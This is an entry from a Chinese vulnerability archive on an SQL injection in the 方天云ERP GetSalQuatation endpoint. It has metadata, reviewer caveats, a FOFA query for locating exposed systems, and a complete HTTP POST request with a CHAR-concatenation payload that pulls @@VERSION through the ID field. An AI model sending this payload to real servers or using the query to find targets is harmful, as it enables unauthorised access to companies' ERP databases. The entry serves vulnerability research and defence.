---
source: "wy876 漏洞文库"
title: "方天云ERP GetSalQuatation ID SQL 注入"
product: "方天云ERP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "无Cookie未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/lgp6fcox304sdet3"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%96%B9%E5%A4%A9%E7%A7%91%E6%8A%80%28%E6%B7%B1%E5%9C%B3%29%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E6%96%B9%E5%A4%A9%E4%BA%91ERP%E7%B3%BB%E7%BB%9FGetSalQuatation%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"AjaxMethods.asmx/GetCompanyItem\""
id: "vw-c7437487b0c73676c31aed07"
entity_id: "ve-c7437487b0c73676c31aed07"
schema_version: "1"
previous_fofa_unverified: "body="
---

# 方天云ERP GetSalQuatation ID SQL 注入

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：方天云ERP；GetSalQuatation ID SQLi
- 版本、配置及部署条件：无版本
- 认证与权限前提：无Cookie未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- Content-Type JSON但{ID:...}键不加引号不是标准JSON，需原实现宽松解析证据
- FOFA body残缺；GetSalQuatation拼写按路由核不自动纠
- 只版本表达式无响应/根因/修复

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
方天软件以云ERP+MES产品为核心，整合设备层的工业数据，提供软硬件智能+整合方案服务，赋能数字工厂新智造。在模具制造、五金机械、塑胶成型、电子组装等行业成效显著，包括财富500强的企业也正在通过方天软件的综合管理方案而持续获益。方天云ERP系统GetSalQuatation存在SQL注入漏洞

## 二、影响版本
+ 方天云ERP

## 三、资产测绘
+ fofa`body="AjaxMethods.asmx/GetCompanyItem"`
+ 特征


## 四、漏洞复现
```http
POST /AjaxMethods.asmx/GetSalQuatation HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Connection: close
 
{ID:"(SELECT CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113)+(CASE WHEN (8725=8725) THEN @@VERSION ELSE CHAR(48) END)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(106)+CHAR(113))"}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lgp6fcox304sdet3>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
